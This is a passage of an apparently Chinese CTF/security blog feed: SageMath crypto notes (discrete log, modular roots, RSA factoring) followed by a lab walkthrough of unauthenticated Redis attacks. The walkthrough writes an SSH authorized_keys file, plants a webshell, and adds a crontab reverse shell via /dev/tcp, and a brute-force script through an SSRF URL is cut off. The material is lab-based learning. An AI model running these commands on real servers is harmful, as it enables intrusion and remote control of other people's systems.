class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span>，且<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mo>&lt;</mo><mo>&lt;</mo><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">e&lt;&lt;d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span></span></span></span>(<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>d</mi><mi>l</mi></msub></mrow><annotation encoding=\"application/x-tex\">d_l</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 指<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span></span></span></span> 的低 265 位)</p>\n<p>则<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mo>≈</mo><mi>e</mi></mrow><annotation encoding=\"application/x-tex\">k≈e</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">e</span></span></span></span>，可以遍历，只剩未知数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">low_d = xxx</span><br><span class=\"line\">n = x</span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">150</span>):</span><br><span class=\"line\">        p = var(<span class=\"string\">&#x27;p&#x27;</span>)</span><br><span class=\"line\">        p0 = solve_mod([<span class=\"number\">149</span>*p*low_d  == p + k*(n*p - p^<span class=\"number\">2</span> - n + p)], <span class=\"number\">2</span>^<span class=\"number\">265</span>)</span><br><span class=\"line\">        maybe_p += [<span class=\"built_in\">int</span>(x[<span class=\"number\">0</span>]) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> p0]</span><br><span class=\"line\"><span class=\"comment\">#会输出一堆结果，还需要验证哪个是对的</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"discrete_log\"><a class=\"anchor\" href=\"#discrete_log\">#</a> discrete_log</h1>\n<p>作用：求解离散对数问题</p>\n<p>例如</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>g</mi><mi>m</mi></msup><mo stretchy=\"false\">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">c =g^m(mod\\,p)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mclose\">)</span></span></span></span>，其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mo separator=\"true\">,</mo><mi>g</mi><mo separator=\"true\">,</mo><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">c,g,p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 已知，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 未知</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m = discrete_log(c,mod(g,p))</span><br><span class=\"line\"><span class=\"comment\">#数据：</span></span><br><span class=\"line\"><span class=\"comment\">#g = 8999 </span></span><br><span class=\"line\"><span class=\"comment\">#c = 11721478752747238947534577901795278971298347908127389421908790123 </span></span><br><span class=\"line\"><span class=\"comment\">#p = 12297383901740584470151577318651150337988716807049317851420298478128932232846789427512414204247770572072680737351875225891650166807323215624748551744377958007176198392481481171792078565005580006750936049744616851983231170824931892761202881982041842121034608612146861881334101500003915726821683000760611763097</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"nth_root\"><a class=\"anchor\" href=\"#nth_root\">#</a> nth_root</h1>\n<p>作用：模数下开根</p>\n<p>例如</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mo stretchy=\"false\">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">c = m^e(mod\\,n)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">e</span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m=Mod(c,n).nth_root(e, <span class=\"built_in\">all</span>=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n<h1 id=\"px-zz\"><a class=\"anchor\" href=\"#px-zz\">#</a> P.&lt;x&gt; = ZZ[]</h1>\n<p>作用：整数域下设未知数 x</p>\n<p>例如</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">44538727182858207226040251762322467288176239968967952269350336889655421753182750730773886813281253762528207970314694060562016861614492626112150259048393048617529867598499261392152098087985858905944606287003243</span></span><br><span class=\"line\">enc = <span class=\"number\">37578889436345667053409195986387874079577521081198523844555524501835825138236698001996990844798291201187483119265306641889824719989940722147655181198458261772053545832559971159703922610578530282146835945192532</span></span><br><span class=\"line\"></span><br><span class=\"line\">P.&lt;k&gt; = ZZ[] </span><br><span class=\"line\">p = k** <span class=\"number\">6</span> + <span class=\"number\">7</span> *k** <span class=\"number\">4</span> - <span class=\"number\">40</span> *k** <span class=\"number\">3</span> + <span class=\"number\">12</span> *k** <span class=\"number\">2</span> - <span class=\"number\">114</span> *k + <span class=\"number\">31377</span></span><br><span class=\"line\">q = k** <span class=\"number\">5</span> - <span class=\"number\">8</span> *k** <span class=\"number\">4</span> + <span class=\"number\">19</span> *k** <span class=\"number\">3</span> - <span class=\"number\">313</span> *k** <span class=\"number\">2</span> - <span class=\"number\">14</span> *k + <span class=\"number\">14011</span></span><br><span class=\"line\">f = p * q - n </span><br><span class=\"line\">k = f.roots()[<span class=\"number\">0</span>][<span class=\"number\">0</span>] </span><br><span class=\"line\">p = ZZ(p (k)) </span><br><span class=\"line\">q = ZZ(q(k)) </span><br><span class=\"line\">d = inverse_mod( <span class=\"number\">31337</span>, (p- <span class=\"number\">1</span>)*(q- <span class=\"number\">1</span>)) </span><br><span class=\"line\">m = power_mod(enc, d, n) </span><br><span class=\"line\"><span class=\"built_in\">print</span> (long_to_bytes(m)</span><br></pre></td></tr></table></figure>\n<h1 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h1>\n<h2 id=\"facx\"><a class=\"anchor\" href=\"#facx\">#</a> fac(x)</h2>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mo stretchy=\"false\">!</mo></mrow><annotation encoding=\"application/x-tex\">x!</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">!</span></span></span></span></p>\n<h2 id=\"modcn\"><a class=\"anchor\" href=\"#modcn\">#</a> Mod(c,n)</h2>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">c</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span></span></span></span> 在模<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 下的值</p>\n<h2 id=\"euler_phix\"><a class=\"anchor\" href=\"#euler_phix\">#</a> euler_phi(x)</h2>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 的欧拉函数</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/",
            "url": "http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/",
            "title": "Redis漏洞利用",
            "date_published": "2024-03-07T07:05:02.000Z",
            "content_html": "<p>redis 默认端口：6379</p>\n<h1 id=\"redis介绍\"><a class=\"anchor\" href=\"#redis介绍\">#</a> Redis 介绍</h1>\n<p>redis 默认端口：6379</p>\n<h2 id=\"基本命令展示\"><a class=\"anchor\" href=\"#基本命令展示\">#</a> 基本命令展示</h2>\n<p>(redis 不区分命令的大小写)</p>\n<p>基本信息：info</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307160114180.png\" alt=\"image-20240307160114180\"></p>\n<p>把键 x 的内容设为 test：set x “test”</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307160219931.png\" alt=\"image-20240307160219931\"></p>\n<p>获取键 x 的值：get x</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307160506294.png\" alt=\"image-20240307160506294\"></p>\n<p>查看所有键：KEYS *</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307160259833.png\" alt=\"image-20240307160259833\"></p>\n<p>查看目录：config get dir</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307160318019.png\" alt=\"image-20240307160318019\"></p>\n<p>查看 rdb 文件名：config set dbfilename</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307160332415.png\" alt=\"image-20240307160332415\"></p>\n<p>获取一个不存在的键的值：get anotherkey</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307160708463.png\" alt=\"image-20240307160708463\"></p>\n<p>其他命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INCR a                          \t# 使用INCR命令将a的值增加1，a必须是数字</span><br><span class=\"line\">config set protected-mode no    \t# 关闭安全模式</span><br><span class=\"line\">config set dir /root/redis      \t# 设置保存目录</span><br><span class=\"line\">config set dbfilename redis.rdb \t# 设置保存文件名</span><br><span class=\"line\">save                            \t# 进行一次备份操作</span><br><span class=\"line\">flushall                            # 删除所有数据</span><br><span class=\"line\">del key                             # 删除键为key的数据</span><br><span class=\"line\">slaveof ip port                     # 设置主从关系</span><br><span class=\"line\">redis-cli -h ip -p 6379 -a passwd   # 外部连接</span><br></pre></td></tr></table></figure>\n<h1 id=\"redis未授权的3种常见攻击演示\"><a class=\"anchor\" href=\"#redis未授权的3种常见攻击演示\">#</a> Redis 未授权的 3 种常见攻击演示</h1>\n<h2 id=\"环境搭建\"><a class=\"anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>攻击机：192.168.43.229 (win10)</p>\n<p>靶机：192.168.43.217 (kali)</p>\n<p>Redis 版本：3.2.0</p>\n<p>kali 安装 Redis 命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class=\"line\">tar xzf redis-3.2.0.tar.gz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> redis-3.2.0</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n<p>修改配置文件 redis.conf，使得 Redis 可以远程访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">注释bind 127.0.0.1</span><br><span class=\"line\">protected-mode改成no</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5CSnipaste_2024-03-07_15-29-02.png\" alt=\"Snipaste_2024-03-07_15-29-02\"></p>\n<p>启动 redis 服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307153254253.png\" alt=\"image-20240307153254253\"></p>\n<p>goby 扫一下靶机 192.168.43.217，确实发现了开放的端口 6379 以及 redis 未授权漏洞</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307154357423.png\" alt=\"image-20240307154357423\"></p>\n<p>攻击机连上 redis：redis-cli.exe -h 192.168.43.217</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307155752249.png\" alt=\"image-20240307155752249\"></p>\n<h2 id=\"写ssh-keygen公钥然后使用私钥登陆\"><a class=\"anchor\" href=\"#写ssh-keygen公钥然后使用私钥登陆\">#</a> 写 ssh-keygen 公钥然后使用私钥登陆</h2>\n<h3 id=\"适用条件\"><a class=\"anchor\" href=\"#适用条件\">#</a> 适用条件</h3>\n<ol>\n<li>Redis 服务使用 ROOT 账号启动</li>\n<li>服务器开放了 SSH 服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li>\n</ol>\n<h3 id=\"kali打开22端口\"><a class=\"anchor\" href=\"#kali打开22端口\">#</a> kali 打开 22 端口</h3>\n<p>去掉端口、监听地址的注释</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307162515593.png\" alt=\"image-20240307162515593\"></p>\n<p>开启远程登录</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307162611553.png\" alt=\"image-20240307162611553\"></p>\n<p>开启用户密码作为连接验证，保存退出</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307162713964.png\" alt=\"image-20240307162713964\"></p>\n<p>开启 sshd 服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service sshd start</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307163110038.png\" alt=\"image-20240307163110038\"></p>\n<h3 id=\"第一步密钥对生成\"><a class=\"anchor\" href=\"#第一步密钥对生成\">#</a> 第一步：密钥对生成</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p>得到私钥文件 key，公钥文件 key.pub</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307161552848.png\" alt=\"image-20240307161552848\"></p>\n<h3 id=\"第二步执行命令\"><a class=\"anchor\" href=\"#第二步执行命令\">#</a> 第二步：执行命令</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh/</span><br><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">set x &quot;\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHaX5ZkG/saOzijPajIYFCQVCz1x4huUj9ATK7WoYzb4X7lQT0JAg4Xei/9mpi2RvA9YkcQC6wmJWETuIvKRYkby8J+tvRPpekk1wQ35rLfoyp8kkoAb2/cmMh0BHGFSHh1xchrVYPDdDZvQvgD4r7fFGHiFgvkAzn6xeoqbNdqAKb2n0Gw17EGJ3P7ajl3EnXYHayMx3Nq2lcnZMGBH+XQKS6ngaPrwSXYVE/MwmlBwqM5eXEt76Kh/wGuyPnQKIzXk/B/CYEAwqxyKPBwQ+vPcr40+NTqDXM070+8coc9tXlX8MKaqPmh4Wb4YFkV8FDypj34mln35M6wHM/vExgmlUo1lAdXYFQxhuVybUsZYW3PM6kW46rlCcoiYTV+Xqs7R294X9Abrh0TMTj74PFC1yHUnV0wBq8Yrx5IA1lYWpBNfK4YCbNVvv2PBRTOfixo8fRGHZl7HMg92yfOFoCOHUVx9/HAUS2iFOSYXrsql1Wbw3ljUTfsAsxrafTAGU= asus@LAPTOP-93KMIID5\\n\\n\\n&quot; #这里前后必须要有\\n\\n\\n，否则会失败，我也不知道为什么。里面写入公钥</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<h3 id=\"第三步连接ssh\"><a class=\"anchor\" href=\"#第三步连接ssh\">#</a> 第三步：连接 ssh</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -i 私钥文件名 root@addr</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307164018721.png\" alt></p>\n<h2 id=\"向web物理路径写webshell\"><a class=\"anchor\" href=\"#向web物理路径写webshell\">#</a> 向 web 物理路径写 Webshell</h2>\n<h3 id=\"适用条件-2\"><a class=\"anchor\" href=\"#适用条件-2\">#</a> 适用条件</h3>\n<p>确保开启 apache 服务</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307165146291.png\" alt=\"image-20240307165146291\"></p>\n<h3 id=\"第一步执行命令\"><a class=\"anchor\" href=\"#第一步执行命令\">#</a> 第一步：执行命令</h3>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307164431430.png\" alt=\"image-20240307164431430\"></p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307164516947.png\" alt=\"image-20240307164516947\"></p>\n<h3 id=\"第二步蚁剑连接\"><a class=\"anchor\" href=\"#第二步蚁剑连接\">#</a> 第二步：蚁剑连接</h3>\n<p>(别忘了 ip 前加 http://)</p>\n<p><img data-src=\"Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%5Cimage-20240307165328540.png\" alt=\"image-20240307165328540\"></p>\n<h2 id=\"利用计划任务执行命令反弹shell\"><a class=\"anchor\" href=\"#利用计划任务执行命令反弹shell\">#</a> 利用计划任务执行命令反弹 shell</h2>\n<p>由于在 windows 上不好执行 crontab，所以只记录一下方法</p>\n<h3 id=\"适用条件-3\"><a class=\"anchor\" href=\"#适用条件-3\">#</a> 适用条件</h3>\n<p>1、root 启用 Redis<br>\n2、redis 无密码或者弱密码</p>\n<h3 id=\"过程\"><a class=\"anchor\" href=\"#过程\">#</a> 过程</h3>\n<p>在 Redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell</p>\n<p>首先监听端口</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 7999</span><br></pre></td></tr></table></figure>\n<p>之后连上 redis 执行以下命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> x <span class=\"string\">&quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/ip/7999 0&gt;&amp;1\\n&quot;</span></span><br><span class=\"line\">config <span class=\"built_in\">set</span> <span class=\"built_in\">dir</span> /var/spool/cron/</span><br><span class=\"line\">config <span class=\"built_in\">set</span> dbfilename root</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p>Centos 的定时任务文件在 /var/spool/cron/<br>\nUbuntu 定时任务文件在 /var/spool/cron/crontabs/</p>\n<h1 id=\"当redis遇上ssrf待做\"><a class=\"anchor\" href=\"#当redis遇上ssrf待做\">#</a> 当 Redis 遇上 SSRF (待做)</h1>\n<h1 id=\"shiro-redis反序列化待做\"><a class=\"anchor\" href=\"#shiro-redis反序列化待做\">#</a> shiro-redis 反序列化 (待做)</h1>\n<h1 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h1>\n<h2 id=\"redis弱口令爆破脚本\"><a class=\"anchor\" href=\"#redis弱口令爆破脚本\">#</a> Redis 弱口令爆破脚本</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.request</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse </span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://xx.xx.xx.xx:8000/ssrf.php?url=&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">param = <span class=\"string\">&#x27;dict://127.0.0.1:6788/auth:&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span 